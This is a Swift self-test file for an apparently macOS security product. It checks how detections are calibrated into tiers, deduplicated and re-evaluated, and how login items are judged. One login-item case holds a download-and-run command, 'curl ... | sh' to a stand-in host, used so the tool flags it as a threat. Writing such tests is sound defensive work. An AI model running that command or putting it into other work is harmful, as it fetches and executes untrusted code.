import Foundation
import RampartShared
import RampartEngine
import RampartBehaviour

// Signal-to-noise policy (DetectionPolicy): calibrated confidence, three tiers, dedupe/grouping, login items,
// store re-evaluation, and no automatic action on a Possible finding.
extension SelfTest {
    static func signalNoiseChecks() {
        func ev(_ s: DetectionSource, _ t: String, _ score: Int, _ detail: String = "") -> Evidence { Evidence(source: s, title: t, detail: detail, score: score) }
        func det(_ name: String, _ cat: ThreatCategory = .suspicious, path: String? = "/Users/u/Downloads/thing", pid: Int32? = nil,
                 conf: Int, sev: Severity = .critical, _ e: [Evidence], date: Date = Date()) -> Detection {
            Detection(date: date, path: path, pid: pid, name: name, category: cat, severity: sev, confidence: conf, evidence: e)
        }

        // 1. A single heuristic is capped below High / Confirmed.
        let oneHeuristic = det("Lookalike Apple link inside x", conf: 100, [ev(.heuristic, "Lookalike Apple link inside x", 88),
                                                                           ev(.heuristic, "Risky link inside x", 88), ev(.heuristic, "Dangerous command inside x", 80)])
        let a1 = DetectionPolicy.assess(oneHeuristic)
        check(a1.signalFamilies.count == 1 && a1.confidence <= DetectionPolicy.heuristicCap, "single heuristic family capped at 70 (was 100)")
        check(a1.level == .possible && !a1.autoRemediate, "single content heuristic is Possible and never auto-remediated")
        let c1 = DetectionPolicy.calibrate(oneHeuristic)
        check(c1.confidence <= 70 && c1.severity <= .low && DetectionPolicy.tier(c1) == .fyi, "single heuristic: severity lowered, FYI tier")
        check(c1.evidence.contains { $0.title == DetectionPolicy.calibrationTitle }, "calibrated finding explains why it was lowered")
        check(DetectionPolicy.calibrate(c1) == c1, "calibration is idempotent")
        let strongRule = det("New launch item runs untrusted code", .persistence, path: "/Users/u/Library/LaunchAgents/x.plist", conf: 98,
                             [ev(.persistence, "R07 New launch item runs untrusted code", 91)])
        let a2 = DetectionPolicy.assess(strongRule)
        check(a2.level == .likely && a2.confidence == 70 && !a2.autoRemediate, "one strong rule: Likely at 70 %, no automatic action")
        let weakSigning = det("Ad-hoc signed program", conf: 50, [ev(.signing, "Ad-hoc signed program", 30), ev(.signing, "Downloaded program without quarantine", 30)])
        check(DetectionPolicy.assess(weakSigning).signalFamilies.isEmpty && DetectionPolicy.tier(weakSigning) == .fyi, "weak signing facts never corroborate; FYI")
        let corroborated = det("Stealer activity", .infostealer, conf: 97, [ev(.behaviour, "R38 Credential-store copy staged in temp", 80),
                                                                            ev(.network, "Upload to a brand-new domain", 70)])
        let a3 = DetectionPolicy.assess(corroborated)
        check(a3.level == .likely && a3.confidence == DetectionPolicy.corroboratedCap && a3.autoRemediate, "two independent signals: Likely (89 %), may act automatically")
        let devBuild = det("Process impersonating RamPart", path: "/Users/u/Rampart/.build-agents/out/Products/Debug/rampartd", conf: 92,
                           [ev(.behaviour, "A process is pretending to be RamPart", 60), ev(.network, "x", 60)])
        check(DetectionPolicy.assess(devBuild).level == .possible && DetectionPolicy.tier(devBuild) == .fyi, "developer build folder: Possible, FYI")
        let bait = det("Honeytoken credential touched", .infostealer, path: "/Users/u/Documents/000 Budget Notes.rtf", conf: 100,
                       [ev(.behaviour, "R39 Honeytoken credential touched", 95, "A Rampart decoy credential file was read. Process: /System/Applications/TextEdit.app/Contents/MacOS/TextEdit (pid 4242, apple)")])
        check(DetectionPolicy.isUserOpenedBait(bait) && DetectionPolicy.tier(bait) == .fyi && !DetectionPolicy.mayAutoRemediate(bait),
              "user opening RamPart's bait file with TextEdit is not 'Infostealer 100 %'")
        let baitThief = det("Honeytoken credential touched", .infostealer, path: "/Users/u/Documents/000 Budget Notes.rtf", conf: 100,
                            [ev(.behaviour, "R39 Honeytoken credential touched", 95, "Process: /private/tmp/x/payload (pid 4243, unsigned)")])
        check(DetectionPolicy.tier(baitThief) == .needsYou && DetectionPolicy.level(baitThief) == .likely, "unsigned program reading the bait still needs you (Likely)")

        // 2. Confirmed only for definitive evidence; a known-bad sample is never lost.
        let hashHit = det("Known malware (hash)", .malware, conf: 100, [ev(.hash, "Known malware (hash)", 100), ev(.signing, "Unsigned program", 30)])
        check(DetectionPolicy.level(hashHit) == .confirmed && DetectionPolicy.calibrate(hashHit).confidence == 100
              && DetectionPolicy.tier(DetectionPolicy.calibrate(hashHit)) == .needsYou && DetectionPolicy.mayAutoRemediate(hashHit),
              "known-bad hash: Confirmed 100 %, Needs you, auto-remediation allowed")
        let xp = det("MACOS.ADLOAD", .adware, path: "/Users/u/Rampart/.build/x", conf: 98, [ev(.xprotect, "MACOS.ADLOAD", 98)])
        check(DetectionPolicy.level(xp) == .confirmed && DetectionPolicy.tier(xp) == .needsYou, "XProtect match is Confirmed even in a developer folder")
        let chain = det("Stealer chain", .infostealer, conf: 100, [ev(.behaviour, "R40 Stealer chain", 95), ev(.behaviour, "R38 Credential-store copy staged in temp", 80)])
        check(DetectionPolicy.level(chain) == .confirmed, "confirmed stealer chain (R40) is Confirmed")
        // End to end through the real engine: a planted known-bad fixture hash.
        let work = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("rampart-snr-\(getpid())")
        try? FileManager.default.createDirectory(at: work, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: work) }
        if let db = try? HashDatabase.inMemory() {
            let fixture = work.appendingPathComponent("com.rampart.snr.knownbad.bin")
            try? Data("harmless fixture listed as known-bad \(UUID())".utf8).write(to: fixture)
            let sha = (try? FileHasher.sha256(path: fixture.path))?.hex ?? ""
            _ = try? db.addKnownBad([KnownBadHash(sha256: sha, name: "SNRFixture", source: "test")])
            let d = ScanCoordinator(database: db).scanFile(at: fixture.path).detection
            check(d.map { DetectionPolicy.level($0) == .confirmed && DetectionPolicy.tier(DetectionPolicy.calibrate($0)) == .needsYou } == true,
                  "engine: known-bad fixture reaches Needs you at Confirmed (no false-negative regression)")
            // EICAR test file: never Needs you.
            let eicarURL = work.appendingPathComponent("com.rampart.test.snr-eicar.com")
            try? EICAR.writeTestFile(to: eicarURL)
            if let e = ScanCoordinator(database: db).scanFile(at: eicarURL.path).detection {
                check(DetectionPolicy.tier(DetectionPolicy.calibrate(e)) == .fyi, "EICAR test file never reaches Needs you")
                check(DetectionPolicy.mayAutoRemediate(e) && DetectionPolicy.isTestSignature(e), "EICAR may still be quarantined automatically (then Handled)")
                var q = e; q.resolved = true
                check(DetectionPolicy.tier(q) == .handled, "quarantined EICAR shows under Handled automatically")
            } else { check(false, "EICAR fixture detected") }
        } else { check(false, "open in-memory hash db") }

        // 3. FYI-only conditions: test, own items, health, unresolved login items.
        let ownPlist = det("New launch item runs untrusted code", .persistence, path: "/Applications/RamPart.app/Contents/MacOS/Rampart", conf: 95,
                           [ev(.persistence, "R07 New launch item runs untrusted code", 91)])
        check(DetectionPolicy.tier(ownPlist) == .fyi, "RamPart's own component never reaches Needs you")
        let health = det("RamPart lost its real-time event feed", path: nil, conf: 90, [ev(.behaviour, "Telemetry source down", 90, "eslogger is down")])
        check(DetectionPolicy.isHealthCondition(health) && DetectionPolicy.tier(health) == .fyi, "health condition is FYI, never a threat")
        let btm = det("New login item runs untrusted code", .persistence, path: "btm:501:6F1C1E2A-0000-4000-8000-123456789ABC", conf: 90,
                      [ev(.persistence, "R10 New login item runs untrusted code", 90)])
        check(DetectionPolicy.tier(btm) == .fyi, "unresolved btm:<uid>:<uuid> login item is FYI, not a threat")

        // 4. Login items resolve to a real program and signer; only real indicators are threats.
        let home = "/Users/u"
        let devSigned = SigningInfo(status: .developerID, teamID: "ABCDE12345", notarized: true)
        check(LaunchItemPolicy.assessLoginItem(label: "Rectangle", target: "/Applications/Rectangle.app", arguments: [], home: home, signing: devSigned)
              == .note("signed and notarized (team ABCDE12345)"), "notarized developer login item is a note")
        if case .note = LaunchItemPolicy.assessLoginItem(label: "backup", target: home + "/bin/backup.sh", arguments: [], home: home, signing: SigningInfo(status: .unsigned)) {
            check(true, "user's own script in home is a note")
        } else { check(false, "user's own script in home is a note") }
        if case .threat(let r) = LaunchItemPolicy.assessLoginItem(label: "updater", target: "/private/tmp/.x/updater", arguments: [], home: home, signing: SigningInfo(status: .unsigned)) {
            check(r.contains { $0.contains("temporary") } && r.contains { $0.contains("hidden") }, "unsigned hidden /tmp login item is a threat with reasons")
        } else { check(false, "unsigned hidden /tmp login item is a threat with reasons") }
        if case .threat = LaunchItemPolicy.assessLoginItem(label: "com.apple.updated", target: "/Users/Shared/upd", arguments: [], home: home, signing: SigningInfo(status: .adHoc)) {
            check(true, "Apple-named, not Apple-signed login item is a threat")
        } else { check(false, "Apple-named, not Apple-signed login item is a threat") }
        if case .threat = LaunchItemPolicy.assessLoginItem(label: "helper", target: "/bin/sh", arguments: ["/bin/sh", "-c", "curl -s http://x.test/a | sh"], home: home, signing: SigningInfo(status: .apple)) {
            check(true, "curl|sh login item is a threat")
        } else { check(false, "curl|sh login item is a threat") }
        check(LaunchItemPolicy.assessLoginItem(label: "x", target: nil, arguments: [], home: home, signing: nil) == .unresolved, "no program path: unresolved")
        let rec = PersistenceRecord(item: PersistenceItem(kind: .btm, label: "6F1C1E2A-0000-4000-8000-123456789ABC", location: "btm:501:6F1C1E2A-0000-4000-8000-123456789ABC",
                                                          target: "/Applications/Rectangle.app"), attributes: [:])
        let resolved = LaunchItemPolicy.applyLoginItem(btm, record: rec, home: home, signing: devSigned)
        check(resolved.path == "/Applications/Rectangle.app" && resolved.name == "New login item: Rectangle" && DetectionPolicy.tier(resolved) == .fyi,
              "btm:<uuid> resolved to real path and human name, FYI note")
        let evil = PersistenceRecord(item: PersistenceItem(kind: .btm, label: "Updater", location: "btm:501:AAAA", target: "/Users/u/Downloads/.cache/upd"), attributes: [:])
        let evilD = LaunchItemPolicy.applyLoginItem(det("New login item runs untrusted code", .persistence, path: "btm:501:AAAA", conf: 45,
                                                        [ev(.persistence, "R10 New login item runs untrusted code", 45)]), record: evil, home: home, signing: SigningInfo(status: .unsigned))
        check(DetectionPolicy.tier(DetectionPolicy.calibrate(evilD)) == .needsYou, "login item hidden in Downloads with unsigned code needs you")

        // 5. Deduplicate and group.
        let t0 = Date(timeIntervalSince1970: 1_800_000_000)
        var dupes: [Detection] = (0..<40).map { i in
            det("RamPart lost its real-time event feed", path: nil, conf: 90, [ev(.behaviour, "Telemetry source down", 90, "eslogger stopped")], date: t0.addingTimeInterval(Double(i) * 60))
        }
        dupes += (0..<5).map { i in det("Risky link inside a.js", path: "/Users/u/Downloads/a.js", conf: 80, [ev(.heuristic, "Risky link inside a.js", 80)], date: t0.addingTimeInterval(Double(i))) }
        let m = DetectionPolicy.mergeDuplicates(dupes)
        check(m.items.count == 2 && m.merged == 43, "45 duplicate detections merged into 2 rows")
        let feed = m.items.first { $0.name.contains("event feed") }
        check(feed?.count == 40 && feed?.firstSeen == t0 && feed?.lastSeen == t0.addingTimeInterval(39 * 60), "merged row has count and first/last seen")
        let sameFile = [det("Risky link inside b", path: "/Users/u/Downloads/b", conf: 80, [ev(.heuristic, "Risky link inside b", 80)]),
                        det("Ad-hoc signed program", path: "/Users/u/Downloads/b", conf: 30, [ev(.signing, "Ad-hoc signed program", 30)]),
                        det("Stealer", .infostealer, path: "/Users/u/Downloads/c", conf: 97, [ev(.behaviour, "R38 x", 80), ev(.network, "y", 70)])]
        let g = DetectionPolicy.groups(sameFile)
        check(g[.fyi]?.count == 1 && g[.fyi]?.first?.members.count == 2, "one row per file with all its signals inside")
        check(g[.needsYou]?.count == 1 && g[.needsYou]?.first?.primary.path == "/Users/u/Downloads/c", "Needs you holds only the likely threat")

        // 6. The badge counts only "Needs you" rows.
        let hashCopy = { () -> Detection in var d = hashHit; d.id = UUID(); return d }()
        let mixed = sameFile + [hashHit, hashCopy, det("EICAR-Test-File", .test, conf: 100, [ev(.heuristic, EICAR.detectionName, 100)]), health, btm]
        let quarantinedHash = { (d: Detection) in d.name == "Known malware (hash)" && d.id == mixed[3].id }
        check(DetectionPolicy.needsYouCount(mixed) == 2, "badge: hash hit + likely stealer = 2 (duplicates of one subject count once)")
        check(DetectionPolicy.needsYouCount(mixed, quarantined: quarantinedHash) == 2, "badge ignores the quarantined copy, keeps the open one")
        check(DetectionPolicy.tier(det("Dangerous pasted command blocked", .malware, path: nil, conf: 95, [ev(.behaviour, "Pasted download-and-run", 95)])) == .handled,
              "a blocked paste is Handled automatically, not Needs you")
        check(DetectionPolicy.needsYouCount(mixed.filter { DetectionPolicy.tier($0) != .needsYou }) == 0, "badge is 0 when nothing needs you")

        // 7. Re-evaluation: a synthetic 500-item store of known-benign patterns shrinks to ~0 "Needs you", planted threats stay.
        var store: [Detection] = []
        let benign: [Detection] = [
            det("RamPart lost its real-time event feed", path: nil, conf: 90, [ev(.behaviour, "Telemetry source down", 90, "eslogger is down")]),
            det(EICAR.detectionName, .test, path: "/private/tmp/com.rampart.test.eicar.com", conf: 100, sev: .medium, [ev(.heuristic, EICAR.detectionName, 100)]),
            det("New launch item runs untrusted code", .persistence, path: "/Applications/RamPart.app/Contents/MacOS/rampartd", conf: 98, [ev(.persistence, "R07 New launch item runs untrusted code", 91)]),
            det("New login item runs untrusted code", .persistence, path: "btm:501:0D1E", conf: 90, [ev(.persistence, "R10 New login item runs untrusted code", 90)]),
            det("Honeytoken credential touched", .infostealer, path: "/Users/u/Documents/zzz Archive Notes.rtf", conf: 100,
                [ev(.behaviour, "R39 Honeytoken credential touched", 95, "Process: /System/Applications/TextEdit.app/Contents/MacOS/TextEdit (pid 1, apple)")]),
            det("Broken code signature", path: "/Applications/Foo.app/Contents/Frameworks/x.dylib", conf: 46, [ev(.signing, "Broken code signature", 46)]),
            det("Risky link inside main.js", path: "/Users/u/Downloads/proj/main.js", conf: 80, [ev(.heuristic, "Risky link inside main.js", 80)]),
            det("Process impersonating RamPart", path: "/Users/u/Rampart/.build-agents/out/Products/Debug/rampart", pid: 7, conf: 45, [ev(.behaviour, "A process is pretending to be RamPart", 45)]),
            det("Lookalike Apple link inside selftest", path: "/private/tmp/claude-501/x/selftest", conf: 100, [ev(.heuristic, "Lookalike Apple link inside selftest", 88), ev(.signing, "Ad-hoc signed program", 30)]),
            det("Unsigned program", path: "/Users/u/bin/tool", conf: 35, [ev(.signing, "Unsigned program", 35)]),
        ]
        for i in 0..<496 {
            var d = benign[i % benign.count]
            d.id = UUID(); d.date = t0.addingTimeInterval(Double(i))
            if i % 3 == 0, let p = d.path, p.hasPrefix("/Users/u/Downloads/proj/") { d.path = p + ".\(i)" }   // some distinct files too
            store.append(d)
        }
        let planted = [hashHit, xp, chain, corroborated].enumerated().map { i, d -> Detection in var d = d; d.id = UUID(); d.path = (d.path ?? "") + ".planted\(i)"; return d }
        store += planted
        let beforeNeeds = store.filter { !$0.resolved && $0.confidence >= 60 }.count   // the old rule: everything >= 60 asked for a decision
        let r = DetectionPolicy.reevaluate(store)
        let afterNeeds = DetectionPolicy.groups(r.items)[.needsYou] ?? []
        print("  re-evaluation: \(store.count) stored, \(beforeNeeds) asked for a decision before; after: \(afterNeeds.count) Needs you rows, \(r.resolved) resolved, \(r.merged) merged, \(r.items.count) rows kept")
        check(store.count == 500, "synthetic store has 500 items")
        check(afterNeeds.count == planted.count, "re-evaluated store: only the planted threats remain in Needs you")
        check(Set(afterNeeds.map(\.primary.path)) == Set(planted.map(\.path)), "every planted malicious fixture kept in Needs you")
        check(r.items.filter { $0.resolved }.allSatisfy { $0.resolution?.hasPrefix(DetectionPolicy.recheckedReason) == true }, "auto-resolved items carry a reason")
        check(r.items.count < 100, "duplicates merged (\(r.items.count) rows left from 500)")
        check(DetectionPolicy.reevaluate(r.items).resolved == 0 && DetectionPolicy.reevaluate(r.items).merged == 0, "re-evaluation is stable on a second run")
        let quarantinedStored = { () -> Detection in var d = hashHit; d.resolved = true; d.id = UUID(); return d }()
        check(DetectionPolicy.reevaluate([quarantinedStored]).items == [quarantinedStored], "resolved / quarantined history is never rewritten")

        // 8. Real store snapshot (optional): RAMPART_SNR_STORE=/path/to/detections.json prints before / after numbers.
        if let path = ProcessInfo.processInfo.environment["RAMPART_SNR_STORE"], let data = FileManager.default.contents(atPath: path),
           let list = try? JSONDecoder.rampart.decode([Detection].self, from: data) {
            let open = list.filter { !$0.resolved }
            let rr = DetectionPolicy.reevaluate(list)
            let gs = DetectionPolicy.groups(rr.items)
            print("  real store \(path): \(list.count) items, \(open.count) open (old badge), \(open.filter { $0.confidence >= 60 }.count) at alert level, \(open.filter { $0.confidence >= 90 }.count) at 'High confidence'")
            print("  after: Needs you \(gs[.needsYou]?.count ?? 0), Handled \(gs[.handled]?.count ?? 0), FYI \(gs[.fyi]?.count ?? 0); resolved \(rr.resolved), merged \(rr.merged)")
            for g in gs[.needsYou] ?? [] { print("    NEEDS YOU: \(DetectionPolicy.level(g.primary).label) \(g.primary.confidence)% \(g.primary.name) \(g.primary.path ?? "-")") }
        }
    }
}
